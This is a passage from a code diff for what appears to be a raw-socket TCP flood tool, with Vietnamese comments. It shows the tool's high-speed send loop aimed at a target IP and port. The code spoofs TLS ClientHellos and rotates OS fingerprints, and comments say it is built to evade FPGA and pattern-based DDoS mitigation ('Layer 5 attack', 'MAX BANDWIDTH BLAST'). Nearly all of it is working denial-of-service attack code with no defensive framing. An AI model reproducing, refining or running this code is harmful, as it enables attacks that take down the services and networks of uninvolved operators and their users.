-                        flags = (5<<12)|0x004; // RST
-                        th->psh=0; th->ack=0; th->rst=1; th->fin=0; th->syn=0; th->urg=0;
-                    } else {
-                        flags = (5<<12)|0x011; // FIN+ACK
-                        th->psh=0; th->ack=1; th->rst=0; th->fin=1; th->syn=0; th->urg=0;
-                    }
-                    current_pl = 0;
-                    tw[6] = htons(flags);
-                    
-                    unsigned int tot_tcp = V17TCP + current_pl;
-                    unsigned int tot_ip = V17IP + tot_tcp;
-                    ih->tot_len=htons(tot_ip);
-                    if(use_afp){ viov[b].iov_len = V17ETH + tot_ip; }
-                    else { viov[b].iov_len = tot_ip; }
-                    th->seq=htonl(slot_seq[b]);
-                    th->ack_seq=htonl(slot_ack[b]);
-                    th->source=htons(slot_sp[b]);
-                    
-                    // FIX: sequential IP ID + always DF
-                    ih->id=htons(++slot_ipid[b]);
-                    ih->frag_off=htons(0x4000);
-                    ih->check=0;
-                    unsigned short *iw2=(unsigned short*)ih;
-                    unsigned int ic=iw2[0]+iw2[3]+htons((unsigned int)(ih->ttl<<8|IPPROTO_TCP))+iw2[6]+iw2[7]+iw2[8]+iw2[9];
-                    ic+=htons(tot_ip)+ih->id;
-                    ic=(ic>>16)+(ic&0xFFFF); ic+=(ic>>16);
-                    ih->check=(unsigned short)~ic;
-                    th->check=0;
-                    unsigned int cs=tcp_base[b]+tw[0]+tw[2]+tw[3]+tw[4]+tw[5]+tw[7];
-                    cs += htons(tot_tcp); cs += tw[6];
-                    cs=(cs>>16)+(cs&0xFFFF); cs+=(cs>>16);
-                    th->check=(unsigned short)~cs;
-                    
-                    vmsg_active[valid_pkts] = vmsg[b];
-                    valid_pkts++;
-                    
-                    // Reset slot for new connection
-                    slot_st[b] = ST_SYN_SENT;
-                    slot_rn[b] = 0;
-                    slot_syn_sent[b] = 0;
-                    slot_seq[b] = fast_rand();
-                    slot_ack[b] = 0; // reset: don't use stale ack
-                    port_to_slot[slot_sp[b]] = -1;
-                    unsigned short p2;
-                    do { p2 = (unsigned short)(1024 + (fast_rand() % 64000)); } while(port_to_slot[p2] != -1);
-                    slot_sp[b] = p2;
-                    port_to_slot[p2] = b;
-                    slot_ch_sent[b] = 0;
-                    
-                    // New OS fingerprint per connection
-                    slot_ttl[b] = ttl_t[fast_rand()%ttl_sz];
-                    slot_win[b] = win_t[fast_rand()%win_sz];
-                    slot_ipid[b] = fast_rand() & 0xFFFF; // New sequential IP ID base
-                    slot_tsval[b] = fast_rand(); slot_tsecr[b] = 0; slot_wscale[b] = 0;
+                if (r_use_afp)
+                    sendto(r_fd_send, r_syn_buf, R_ETH+R_IP+20+opt_len, 0,
+                           (struct sockaddr*)&r_dst_sll, sizeof(r_dst_sll));
+                else
+                    sendto(r_fd_send, r_syn_buf+R_ETH, R_IP+20+opt_len, 0,
+                           (struct sockaddr*)&r_raw_dst, sizeof(r_raw_dst));
+            }
+
+            /* 2. Nhận SYN-ACK, RST → cập nhật trạng thái */
+            { int rcvd;
+              while ((rcvd=recv(r_fd_recv, r_recv_buf, 4096, MSG_DONTWAIT))>0) {
+                if (rcvd < R_ETH+R_IP+20) continue;
+                struct iphdr *rih = (struct iphdr*)(r_recv_buf+R_ETH);
+                if (rih->protocol != IPPROTO_TCP) continue;
+                struct tcphdr *rth = (struct tcphdr*)(r_recv_buf+R_ETH+(rih->ihl<<2));
+                unsigned short dport = ntohs(rth->dest);
+                int b = r_port_map[dport];
+                if (b<0) continue;
+
+                /* RST → reset slot */
+                if (rth->rst && r_st[b]==R_ST_EST) {
+                    r_st[b]=R_ST_SYN; r_rn[b]=0; r_syn_cnt[b]=0;
+                    r_seq[b]=fast_rand(); r_ack[b]=fast_rand();
+                    r_port_map[r_sp[b]]=-1;
+                    unsigned short np;
+                    do { np=(unsigned short)(1024+(fast_rand()%64511)); } while(r_port_map[np]!=-1);
+                    r_sp[b]=np; r_port_map[np]=b;
+                    r_ch_sent[b]=0; r_ipid[b]=fast_rand()&0xFFFF;
+                    r_prof_idx[b]=fast_rand()%n_profiles;
                     continue;
                 }
 
-                // Raw data blast
-                unsigned int pl_sum_ch = 0;
-                slot_ch_sent[b] = 1;
+                /* SYN-ACK → hoàn tất 3WHS */
+                if (!(rth->syn && rth->ack)) continue;
+                if (r_st[b]!=R_ST_SYN) continue;
 
-                // 1. TCP Flags Randomization (80% ACK, 20% PSH+ACK)
-                unsigned short r_flag = fast_rand() % 100;
-                if(r_flag < 80) {
-                    flags = (5<<12)|0x010; // ACK only
-                    th->psh=0; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=0;
+                r_ack[b] = ntohl(rth->seq)+1;
+                r_seq[b]++;
+
+                /* Gửi ACK */
+                memset(r_ack_buf, 0, R_FLEN);
+                if (r_use_afp) { memcpy(r_ack_buf,r_gw_mac,6); memcpy(r_ack_buf+6,r_src_mac,6);
+                                 r_ack_buf[12]=8; r_ack_buf[13]=0; }
+                struct iphdr *ih3 = (struct iphdr*)(r_ack_buf+R_ETH);
+                ih3->ihl=5; ih3->version=4; ih3->tot_len=htons(R_IP+R_TCP);
+                ih3->frag_off=htons(0x4000); ih3->ttl=v17_profiles[r_prof_idx[b]].ttl;
+                ih3->protocol=IPPROTO_TCP; ih3->saddr=src_ip; ih3->daddr=bin_target_ip;
+                ih3->id=htons(++r_ipid[b]);
+                struct tcphdr *th3 = (struct tcphdr*)(r_ack_buf+R_ETH+R_IP);
+                th3->source=htons(r_sp[b]); th3->dest=bin_target_port;
+                th3->seq=htonl(r_seq[b]); th3->ack_seq=htonl(r_ack[b]);
+                th3->doff=5; th3->ack=1; th3->window=htons(65535);
+
+                ih3->check=0;
+                { unsigned int c=0; unsigned short *w=(unsigned short*)ih3;
+                  for(int i=0;i<10;i++) c+=w[i];
+                  c=(c>>16)+(c&0xFFFF); c+=(c>>16); ih3->check=(unsigned short)~c; }
+                th3->check=0;
+                { unsigned int c=(src_ip&0xFFFF)+(src_ip>>16)
+                    +(bin_target_ip&0xFFFF)+(bin_target_ip>>16)
+                    +htons(IPPROTO_TCP)+htons(R_TCP);
+                  unsigned short *w=(unsigned short*)th3;
+                  for(int i=0;i<10;i++) c+=w[i];
+                  c=(c>>16)+(c&0xFFFF); c+=(c>>16); th3->check=(unsigned short)~c; }
+
+                if (r_use_afp)
+                    sendto(r_fd_send, r_ack_buf, R_ETH+R_IP+R_TCP, 0,
+                           (struct sockaddr*)&r_dst_sll, sizeof(r_dst_sll));
+                else
+                    sendto(r_fd_send, r_ack_buf+R_ETH, R_IP+R_TCP, 0,
+                           (struct sockaddr*)&r_raw_dst, sizeof(r_raw_dst));
+                r_st[b] = R_ST_EST;
+                r_ch_sent[b] = 0;
+              }
+            }
+
+            /* 3. HOT SEND LOOP — Chỉ khi L4 đã active */
+            if (!r_l4_active) continue;
+
+            struct mmsghdr r_active[R_SLOTS];
+            int r_valid = 0;
+
+            for (int b=0; b<R_SLOTS; b++) {
+                if (r_st[b]!=R_ST_EST && r_st[b]!=R_ST_FORCE) {
+                    if (r_syn_cnt[b]>=1) { r_st[b]=R_ST_FORCE; r_ack[b]=fast_rand(); } /* Force sau 1 SYN */
+                    else continue;
+                }
+                unsigned char *fr = r_buf[b];
+                struct iphdr *ih = (struct iphdr*)(fr+R_ETH);
+                struct tcphdr *th = (struct tcphdr*)(fr+R_ETH+R_IP);
+                const V17OsProfile *prof = &v17_profiles[r_prof_idx[b]];
+                r_rn[b]++;
+
+                /* TLS ClientHello sau khi ESTABLISHED (Layer 5 attack) */
+                if (r_st[b]==R_ST_EST && !r_ch_sent[b]) {
+                    unsigned char ch[768]; memset(ch,0,sizeof(ch));
+                    if(r_use_afp){memcpy(ch,r_gw_mac,6);memcpy(ch+6,r_src_mac,6);ch[12]=8;ch[13]=0;}
+                    unsigned char chp[V17_MAX_CH_SIZE]; int cp=0;
+                    chp[cp++]=0x16; chp[cp++]=0x03; chp[cp++]=0x01; /* TLS record */
+                    int rl_pos=cp; cp+=2;
+                    chp[cp++]=0x01; int hl_pos=cp; cp+=3; /* ClientHello */
+                    chp[cp++]=0x03; chp[cp++]=0x03; /* TLS 1.2 */
+                    for(int i=0;i<32;i++) chp[cp++]=fast_rand()&0xFF; /* Random */
+                    chp[cp++]=32; for(int i=0;i<32;i++) chp[cp++]=fast_rand()&0xFF; /* Session ID */
+                    /* Cipher suites (Chrome 120) */
+                    unsigned short ciphers[]={0x1301,0x1302,0x1303,0xc02b,0xc02f,0xc02c,
+                        0xc030,0xcca9,0xcca8,0xc013,0xc014,0x009c,0x009d,0x002f,0x0035};
+                    int nc=15; chp[cp++]=(nc*2)>>8; chp[cp++]=(nc*2)&0xFF;
+                    for(int i=0;i<nc;i++){chp[cp++]=ciphers[i]>>8;chp[cp++]=ciphers[i]&0xFF;}
+                    chp[cp++]=1; chp[cp++]=0; /* Compression: null */
+                    int ext_lp=cp; cp+=2; int ext_s=cp;
+                    /* SNI */
+                    const char *sni=v17_sni_domains[fast_rand()%n_sni];
+                    int sl=strlen(sni);
+                    chp[cp++]=0;chp[cp++]=0; int sel=sl+5;
+                    chp[cp++]=sel>>8;chp[cp++]=sel&0xFF;
+                    chp[cp++]=(sel-2)>>8;chp[cp++]=(sel-2)&0xFF;
+                    chp[cp++]=0;chp[cp++]=sl>>8;chp[cp++]=sl&0xFF;
+                    memcpy(chp+cp,sni,sl);cp+=sl;
+                    /* supported_groups */
+                    chp[cp++]=0;chp[cp++]=0x0A;chp[cp++]=0;chp[cp++]=0x0A;
+                    chp[cp++]=0;chp[cp++]=0x08;
+                    unsigned short g[]={0x001D,0x0017,0x0018,0x0019};
+                    for(int i=0;i<4;i++){chp[cp++]=g[i]>>8;chp[cp++]=g[i]&0xFF;}
+                    /* signature_algorithms */
+                    chp[cp++]=0;chp[cp++]=0x0D;chp[cp++]=0;chp[cp++]=0x14;
+                    chp[cp++]=0;chp[cp++]=0x12;
+                    unsigned short sa[]={0x0403,0x0804,0x0401,0x0503,0x0805,0x0501,0x0806,0x0601,0x0201};
+                    for(int i=0;i<9;i++){chp[cp++]=sa[i]>>8;chp[cp++]=sa[i]&0xFF;}
+                    /* key_share x25519 */
+                    chp[cp++]=0;chp[cp++]=0x33;chp[cp++]=0;chp[cp++]=0x26;
+                    chp[cp++]=0;chp[cp++]=0x24;chp[cp++]=0;chp[cp++]=0x1D;
+                    chp[cp++]=0;chp[cp++]=0x20;
+                    for(int i=0;i<32;i++) chp[cp++]=fast_rand()&0xFF;
+                    /* supported_versions */
+                    chp[cp++]=0;chp[cp++]=0x2B;chp[cp++]=0;chp[cp++]=5;chp[cp++]=4;
+                    chp[cp++]=0x03;chp[cp++]=0x04;chp[cp++]=0x03;chp[cp++]=0x03;
+                    /* ALPN h2+http/1.1 */
+                    chp[cp++]=0;chp[cp++]=0x10;chp[cp++]=0;chp[cp++]=0x0E;
+                    chp[cp++]=0;chp[cp++]=0x0C;chp[cp++]=2;chp[cp++]='h';chp[cp++]='2';
+                    chp[cp++]=8;memcpy(chp+cp,"http/1.1",8);cp+=8;
+                    /* Cập nhật độ dài */
+                    int ext_t=cp-ext_s; chp[ext_lp]=ext_t>>8; chp[ext_lp+1]=ext_t&0xFF;
+                    int hl=cp-hl_pos-3; chp[hl_pos]=(hl>>16)&0xFF; chp[hl_pos+1]=(hl>>8)&0xFF; chp[hl_pos+2]=hl&0xFF;
+                    int rl=cp-rl_pos-2; chp[rl_pos]=rl>>8; chp[rl_pos+1]=rl&0xFF;
+
+                    /* Build IP+TCP cho ClientHello */
+                    struct iphdr *cih=(struct iphdr*)(ch+R_ETH);
+                    cih->ihl=5;cih->version=4;cih->tot_len=htons(R_IP+R_TCP+cp);
+                    cih->frag_off=htons(0x4000);cih->ttl=prof->ttl;cih->protocol=IPPROTO_TCP;
+                    cih->saddr=src_ip;cih->daddr=bin_target_ip;cih->id=htons(++r_ipid[b]);
+                    cih->check=0;
+                    {unsigned int c=0;unsigned short*w=(unsigned short*)cih;
+                     for(int i=0;i<10;i++)c+=w[i];c=(c>>16)+(c&0xFFFF);c+=(c>>16);
+                     cih->check=(unsigned short)~c;}
+                    struct tcphdr *cth=(struct tcphdr*)(ch+R_ETH+R_IP);
+                    memset(cth,0,R_TCP);
+                    cth->source=htons(r_sp[b]);cth->dest=bin_target_port;
+                    cth->seq=htonl(r_seq[b]);cth->ack_seq=htonl(r_ack[b]);
+                    cth->doff=5;cth->psh=1;cth->ack=1;cth->window=htons(prof->window);
+                    memcpy(ch+R_ETH+R_IP+R_TCP,chp,cp);
+                    cth->check=0;
+                    {unsigned int c=(src_ip&0xFFFF)+(src_ip>>16)+(bin_target_ip&0xFFFF)+(bin_target_ip>>16)
+                        +htons(IPPROTO_TCP)+htons(R_TCP+cp);
+                     unsigned short*w=(unsigned short*)cth;
+                     for(int i=0;i<(R_TCP+cp)/2;i++)c+=w[i];
+                     if((R_TCP+cp)%2)c+=htons(((unsigned short)((unsigned char*)cth)[R_TCP+cp-1])<<8);
+                     c=(c>>16)+(c&0xFFFF);c+=(c>>16);cth->check=(unsigned short)~c;}
+
+                    if(r_use_afp) sendto(r_fd_send,ch,R_ETH+R_IP+R_TCP+cp,0,(struct sockaddr*)&r_dst_sll,sizeof(r_dst_sll));
+                    else sendto(r_fd_send,ch+R_ETH,R_IP+R_TCP+cp,0,(struct sockaddr*)&r_raw_dst,sizeof(r_raw_dst));
+                    r_seq[b]+=cp; r_ch_sent[b]=1;
+                    thread_stats[tid].packets++; thread_stats[tid].bytes+=R_ETH+R_IP+R_TCP+cp;
+                }
+
+                /* Connection churn — xoay nhanh */
+                unsigned int churn = 2000+(fast_rand()%3000); /* 2K-5K rounds */
+                if (r_rn[b] > churn) {
+                    /* Reset slot — giữ FORCE mode để tiếp tục gửi ngay */
+                    r_st[b]=R_ST_FORCE; r_rn[b]=0; r_syn_cnt[b]=1;
+                    r_seq[b]=fast_rand(); r_ack[b]=fast_rand();
+                    r_port_map[r_sp[b]]=-1;
+                    unsigned short np;
+                    do { np=(unsigned short)(1024+(fast_rand()%64511)); } while(r_port_map[np]!=-1);
+                    r_sp[b]=np; r_port_map[np]=b;
+                    r_ch_sent[b]=1; r_ipid[b]=fast_rand()&0xFFFF;
+                    r_prof_idx[b]=fast_rand()%n_profiles;
+                    continue;
+                }
+
+                /* ═══ MAX BANDWIDTH BLAST — O(1) CHECKSUM ═══ */
+                unsigned int pl_len = R_PL;
+                unsigned char *pl = fr+R_ETH+R_IP+R_TCP;
+                /* Random offset vào r_huge, luôn word-aligned */
+                unsigned int pl_off = (fast_rand()%(R_HUGE_PL-pl_len))&~1u;
+                memcpy(pl, r_huge+pl_off, pl_len);
+                /* TLS Application Data header — ghi đè 5 bytes đầu */
+                pl[0]=0x17; pl[1]=0x03; pl[2]=0x03;
+                pl[3]=(unsigned char)((pl_len-5)>>8); pl[4]=(unsigned char)((pl_len-5)&0xFF);
+
+                /* Cập nhật IP/TCP fields */
+                unsigned int tot_ip = R_IP+R_TCP+R_PL; /* Kích thước cố định */
+                unsigned short new_id = htons(++r_ipid[b]);
+                r_seq[b] += pl_len;
+                unsigned int seq_n = htonl(r_seq[b]);
+                unsigned int ack_n = htonl(r_ack[b]);
+                unsigned short sp_hs = htons(r_sp[b]);
+
+                ih->id = new_id;
+                ih->tot_len = htons(tot_ip);
+                ih->frag_off = htons(0x4000);
+                ih->ttl = prof->ttl;
+                th->source = sp_hs;
+                th->seq = seq_n; th->ack_seq = ack_n;
+                th->doff=5; th->psh=1; th->ack=1;
+                th->rst=0; th->fin=0; th->syn=0;
+                th->window = htons(prof->window);
+
+                /* O(1) IP checksum: base + id + ttl/proto */
+                { unsigned short ttl_p = htons(((unsigned short)prof->ttl<<8)|IPPROTO_TCP);
+                  unsigned int ic = r_base_ip[b] + new_id + ttl_p;
+                  ic=(ic>>16)+(ic&0xFFFF); ic+=(ic>>16);
+                  ih->check = (unsigned short)~ic; }
+
+                /* O(1) TCP checksum: base + source + seq + ack + payload_prefix_sum */
+                { unsigned int pl_word_off = pl_off>>1;
+                  unsigned int pl_cs = r_huge_sum[pl_word_off+R_PL/2] - r_huge_sum[pl_word_off];
+                  /* Điều chỉnh cho 5 bytes TLS header đã ghi đè */
+                  unsigned short old0=*((unsigned short*)(r_huge+pl_off)+0);
+                  unsigned short old1=*((unsigned short*)(r_huge+pl_off)+1);
+                  unsigned short old2=*((unsigned short*)(r_huge+pl_off)+2);
+                  unsigned short new0=*((unsigned short*)pl+0);
+                  unsigned short new1=*((unsigned short*)pl+1);
+                  unsigned short new2=*((unsigned short*)pl+2);
+                  pl_cs = pl_cs - old0 + new0 - old1 + new1 - old2 + new2;
+                  unsigned short *sq=(unsigned short*)&seq_n, *ak=(unsigned short*)&ack_n;
+                  unsigned int tc = r_base_cs[b] + sp_hs + sq[0]+sq[1] + ak[0]+ak[1] + pl_cs;
+                  tc=(tc>>16)+(tc&0xFFFF); tc+=(tc>>16);
+                  th->check = (unsigned short)~tc; }
+
+                r_iov[b].iov_len = tot_ip;
+                r_active[r_valid++] = r_msg[b];
+            }
+
+            if (r_valid == 0) continue;
+
+            /* ═══ MAX BURST SEND — 1024x replay, 4-socket round-robin ═══ */
+            static __thread int _rr_fd_idx = 0;
+            int _fds4[4]={r_fd_send,r_fd_send2,r_fd_send3,r_fd_send4};
+            int cur_fd = _fds4[_rr_fd_idx&3];
+            unsigned long long tot_sent=0, tot_bytes=0;
+            for (int burst=0; burst<1024; burst++) {
+                int sent = sendmmsg(cur_fd, r_active, r_valid, 0);
+                if (sent>0) {
+                    tot_sent+=sent;
+                    tot_bytes+=(unsigned long long)sent*r_iov[0].iov_len;
+                    /* Round-robin sang socket tiếp theo */
+                    cur_fd = _fds4[(++_rr_fd_idx)&3];
                 } else {
-                    flags = (5<<12)|0x018; // PSH+ACK
-                    th->psh=1; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=0;
-                }
-                
-                    // Fix 4: Variable payload size 64-1400 (defeats FPGA constant-size pattern)
-                    unsigned int raw_pl = 64 + (fast_rand() % 1337);
-                    if(raw_pl & 1) raw_pl++;
-                    current_pl = raw_pl;
-                    tw[6] = htons(flags);
-
-                    unsigned char *pl = fr + V17ETH + V17IP + V17TCP;
-
-                    // Fix 1: Pure L4 — no TLS overhead, rotate through L4 protocol prefixes only
-                    // HTTP GET, HTTP/2 preface, SSH probe, raw binary, SMTP EHLO
-                    static const struct { unsigned char data[16]; int len; } proto_prefix[] = {
-                        // HTTP/1.1 GET
-                        {{0x47,0x45,0x54,0x20,0x2f,0x20,0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x0d,0x0a}, 16},
-                        // HTTP/1.1 POST
-                        {{0x50,0x4f,0x53,0x54,0x20,0x2f,0x20,0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x0d}, 16},
-                        // SSH-2.0 probe
-                        {{0x53,0x53,0x48,0x2d,0x32,0x2e,0x30,0x2d,0x4f,0x70,0x65,0x6e,0x53,0x53,0x48,0x5f}, 16},
-                        // SMTP EHLO
-                        {{0x45,0x48,0x4c,0x4f,0x20,0x6c,0x6f,0x63,0x61,0x6c,0x68,0x6f,0x73,0x74,0x0d,0x0a}, 16},
-                        // Raw binary (no prefix)
-                        {{0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 0},
-                        // Raw binary 2
-                        {{0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 0},
-                        // FTP USER
-                        {{0x55,0x53,0x45,0x52,0x20,0x61,0x6e,0x6f,0x6e,0x79,0x6d,0x6f,0x75,0x73,0x0d,0x0a}, 16},
-                        // HTTP/2 preface
-                        {{0x50,0x52,0x49,0x20,0x2a,0x20,0x48,0x54,0x54,0x50,0x2f,0x32,0x2e,0x30,0x0d,0x0a}, 16},
-                    };
-                    int pp_idx = (int)(fast_rand() % 8);
-                    int pp_len = proto_prefix[pp_idx].len;
-                    if(pp_len > 0) memcpy(pl, proto_prefix[pp_idx].data, pp_len);
-                    if(current_pl > (unsigned int)pp_len) {
-                        unsigned int random_len = current_pl - pp_len;
-                        unsigned int pl_offset = (fast_rand() % (HUGE_PL_SIZE - random_len)) & ~1;
-                        memcpy(pl + pp_len, huge_pl_buf + pl_offset, random_len);
-                        unsigned int pl_sum_bp = 0;
-                        for(int pi=0;pi<pp_len/2;pi++) pl_sum_bp+=((unsigned short*)proto_prefix[pp_idx].data)[pi];
-                        unsigned int random_sum = huge_pl_sum[(pl_offset+random_len)/2] - huge_pl_sum[pl_offset/2];
-                        pl_sum_ch = pl_sum_bp + random_sum;
-                    } else {
-                        pl_sum_ch = 0;
+                    if (errno==ENOBUFS||errno==EAGAIN) {
+                        cur_fd = _fds4[(++_rr_fd_idx)&3];
+                        continue; /* Không sleep — busy send */
                     }
-
-                { // Common send path
-                unsigned int tot_tcp = V17TCP + current_pl;
-                unsigned int tot_ip = V17IP + tot_tcp;
-
-                // Update TCP Timestamp option in-place (tsval monotone, tsecr from SYN-ACK)
-                unsigned int *tsval_ptr = (unsigned int *)(fr + V17ETH + V17IP + 20 + 4);
-                unsigned int *tsecr_ptr = (unsigned int *)(fr + V17ETH + V17IP + 20 + 8);
-                // Fix 5: Realistic tsval increment — kernel 250Hz = +1 per 4ms
-                // At ~Mpps, this fires ~1000x/s, so increment by 1-4 to simulate ~250-1000Hz
-                slot_tsval[b] += 1 + (fast_rand() % 4);
-                *tsval_ptr = htonl(slot_tsval[b]);
-                *tsecr_ptr = htonl(slot_tsecr[b]);
-                // TS variable words checksum contribution
-                unsigned short *ts_sw = (unsigned short *)(fr + V17ETH + V17IP + 20 + 4);
-                unsigned int ts_sum = (unsigned int)ts_sw[0] + ts_sw[1] + ts_sw[2] + ts_sw[3];
-
-                slot_seq[b] += current_pl;
-                th->seq=htonl(slot_seq[b]);
-                th->ack_seq=htonl(slot_ack[b]);
-                th->source=htons(slot_sp[b]);
-                th->window=htons(slot_win[b]);
-
-                ih->tot_len=htons(tot_ip);
-                if(use_afp){ viov[b].iov_len = V17ETH + tot_ip; }
-                else { viov[b].iov_len = tot_ip; }
-
-                ih->ttl = slot_ttl[b];
-                unsigned int newttlproto=(unsigned int)(ih->ttl<<8|IPPROTO_TCP);
-                unsigned short *iw2=(unsigned short*)ih;
-
-                // FIX: Sequential IP ID (not random) + always DF
-                ih->id=htons(++slot_ipid[b]);
-                ih->frag_off=htons(0x4000);
-                ih->check=0;
-                unsigned int ic=iw2[0]+iw2[3]+htons(newttlproto)+iw2[6]+iw2[7]+iw2[8]+iw2[9];
-                ic+=htons(tot_ip)+ih->id;
-                ic=(ic>>16)+(ic&0xFFFF); ic+=(ic>>16);
-                ih->check=(unsigned short)~ic;
-
-                th->check=0;
-                // tcp_base already has: src_ip + dst_ip + proto + dport + NOP+NOP + TS-kind+len
-                // tw[0]=sport tw[2..5]=seq/ack tw[6]=flags tw[7]=window
-                unsigned int cs=tcp_base[b]+tw[0]+tw[2]+tw[3]+tw[4]+tw[5]+tw[7];
-                cs += htons(tot_tcp);
-                cs += tw[6];
-                cs += ts_sum;   // tsval + tsecr (variable)
-                cs += pl_sum_ch;
-                cs=(cs>>16)+(cs&0xFFFF); cs+=(cs>>16);
-                th->check=(unsigned short)~cs;
-
-                vmsg_active[valid_pkts] = vmsg[b];
-                valid_pkts++;
-                } // end common send block
-            }
-            
-            if(valid_pkts == 0){
-                continue; // No sleep — spin fast to catch SYN-ACKs for instant shock
-            }
-            
-            // REMOVED: usleep(250) was artificially limiting PPS to ~1M/thread
-            // Adaptive backoff via ENOBUFS handler at line 1943 is sufficient
-
-            if(round==1){
-                LOG_INFO("T%d: hot loop done, calling sendmmsg valid_pkts=%d",tid,valid_pkts);
-                fflush(stdout);
-            }
-            // 128x burst, dual socket, skip checksum between bursts
-            int cur_fd = fd_send;
-            unsigned long long total_sent = 0, total_bytes = 0;
-            for(int burst = 0; burst < 256; burst++) {
-                int sent=sendmmsg(cur_fd,vmsg_active,valid_pkts,0);
-                if(sent>0){
-                    total_sent += sent;
-                    for(int i=0; i<sent; i++) total_bytes += vmsg_active[i].msg_hdr.msg_iov->iov_len;
-                } else {
-                    if(errno==ENOBUFS||errno==EAGAIN){
-                        // Toggle socket immediately, no sleep — keep burst rate max
-                        cur_fd = (cur_fd == fd_send) ? fd_send2 : fd_send;
-                        continue;
-                    }
-                    else break;
+                    break;
                 }
-                
-                // Update seq/checksum for the NEXT burst to avoid duplicate sequence numbers
-                for(int i = 0; i < valid_pkts; i++) {
-                    struct iphdr *bih;
-                    struct tcphdr *bth;
-                    unsigned char *bfr = (unsigned char*)vmsg_active[i].msg_hdr.msg_iov->iov_base;
-                    unsigned short old_seq_hi, old_seq_lo, old_ipid, old_ip_check, old_tcp_check;
-                    unsigned int new_seq;
-                    unsigned short new_seq_hi, new_seq_lo;
-                    unsigned int ip_diff, ip_ck, tcp_diff, tcp_ck;
-
-                    if(use_afp) { bih=(struct iphdr*)(bfr+V17ETH); bth=(struct tcphdr*)(bfr+V17ETH+V17IP); }
-                    else { bih=(struct iphdr*)bfr; bth=(struct tcphdr*)(bfr+V17IP); }
-                    
-                    old_seq_hi = ((unsigned short*)&bth->seq)[0];
-                    old_seq_lo = ((unsigned short*)&bth->seq)[1];
-                    old_ipid = bih->id;
-                    old_ip_check = bih->check;
-                    old_tcp_check = bth->check;
-                    
-                    // Add payload size to seq
-                    unsigned int p_len = ntohs(bih->tot_len) - V17IP - (bth->doff * 4);
-                    new_seq = ntohl(bth->seq) + p_len;
-                    bth->seq = htonl(new_seq);
-                    
-                    // Increment IP ID
-                    bih->id = htons(ntohs(bih->id) + 1);
-                    
-                    new_seq_hi = ((unsigned short*)&bth->seq)[0];
-                    new_seq_lo = ((unsigned short*)&bth->seq)[1];
-                    
-                    ip_diff = (~old_ipid & 0xFFFF) + (bih->id & 0xFFFF);
-                    ip_ck = (~old_ip_check & 0xFFFF) + ip_diff;
-                    ip_ck = (ip_ck >> 16) + (ip_ck & 0xFFFF); ip_ck += (ip_ck >> 16);
-                    bih->check = (unsigned short)~ip_ck;
-                    
-                    tcp_diff = (~old_seq_hi & 0xFFFF) + (new_seq_hi & 0xFFFF)
-                                          + (~old_seq_lo & 0xFFFF) + (new_seq_lo & 0xFFFF);
-                    tcp_ck = (~old_tcp_check & 0xFFFF) + tcp_diff;
-                    tcp_ck = (tcp_ck >> 16) + (tcp_ck & 0xFFFF); tcp_ck += (tcp_ck >> 16);
-                    bth->check = (unsigned short)~tcp_ck;
+                /* Cập nhật seq+ipid incremental */
+                for (int i=0; i<r_valid; i++) {
+                    unsigned char *bfr = (unsigned char*)r_active[i].msg_hdr.msg_iov->iov_base;
+                    struct iphdr *bih; struct tcphdr *bth;
+                    if(r_use_afp){bih=(struct iphdr*)(bfr+R_ETH);bth=(struct tcphdr*)(bfr+R_ETH+R_IP);}
+                    else{bih=(struct iphdr*)bfr;bth=(struct tcphdr*)(bfr+R_IP);}
+                    unsigned int p_len=ntohs(bih->tot_len)-R_IP-(bth->doff*4);
+                    unsigned short o_sh=((unsigned short*)&bth->seq)[0], o_sl=((unsigned short*)&bth->seq)[1];
+                    unsigned short o_id=bih->id;
+                    bth->seq=htonl(ntohl(bth->seq)+p_len);
+                    bih->id=htons(ntohs(bih->id)+1);
+                    unsigned short n_sh=((unsigned short*)&bth->seq)[0], n_sl=((unsigned short*)&bth->seq)[1];
+                    unsigned int d=(~o_sh&0xFFFF)+(n_sh&0xFFFF)+(~o_sl&0xFFFF)+(n_sl&0xFFFF);
+                    unsigned int tc=(~bth->check&0xFFFF)+d;
+                    tc=(tc>>16)+(tc&0xFFFF); tc+=(tc>>16); bth->check=(unsigned short)~tc;
+                    unsigned int id=(~o_id&0xFFFF)+(bih->id&0xFFFF);
+                    unsigned int ic=(~bih->check&0xFFFF)+id;
+                    ic=(ic>>16)+(ic&0xFFFF); ic+=(ic>>16); bih->check=(unsigned short)~ic;
                 }
             }
-            thread_stats[tid].packets     += total_sent;
-            thread_stats[tid].tcp_packets += total_sent;
-            thread_stats[tid].raw_sent    += total_sent;
-            thread_stats[tid].bytes       += total_bytes;
+            thread_stats[tid].packets+=tot_sent;
+            thread_stats[tid].tcp_packets+=tot_sent;
+            thread_stats[tid].raw_sent+=tot_sent;
+            thread_stats[tid].bytes+=tot_bytes;
         }
 
-        free(vbuf);free(vmsg);free(viov);free(tcp_base);free(ip_base);
-
-        free(slot_seq);free(slot_ack);free(slot_sp);free(slot_st);free(slot_rn);
-        free(slot_ttl);free(slot_win);free(slot_syn_sent);
-        free(slot_tls_ver);free(slot_ch_sent);free(slot_tsval);
-        free(slot_tsecr);free(slot_wscale);
-        free(slot_pl_sum);free(slot_ipid);
-        free(huge_pl_buf);free(huge_pl_sum);free(port_to_slot);
-        free(recv_buf);free(syn_buf);free(ack_buf);
-        close(fd_send);close(fd_send2);close(fd_recv);
+        /* Cleanup raw mode */
+        free(r_buf);free(r_msg);free(r_iov);free(r_seq);free(r_ack);free(r_sp);
+        free(r_st);free(r_rn);free(r_syn_cnt);free(r_prof_idx);free(r_ipid);
+        free(r_tsval);free(r_ch_sent);free(r_port_map);
+        free(r_base_cs);free(r_base_ip);
+        free(r_huge);free(r_huge_sum);
+        free(r_recv_buf);free(r_syn_buf);free(r_ack_buf);
+        close(r_fd_send);close(r_fd_send2);close(r_fd_send3);close(r_fd_send4);close(r_fd_recv);
         return NULL;
+    } /* ── KẾT THÚC RAW MODE ── */
+
+v17_safe_mode:;
+    /* ══════════════════════════════════════════════════════════════════════
+     * PHẦN 3: SAFE MODE — TCP SOCK_STREAM + OpenSSL TLS + HTTP/2 + epoll
+     * ══════════════════════════════════════════════════════════════════════
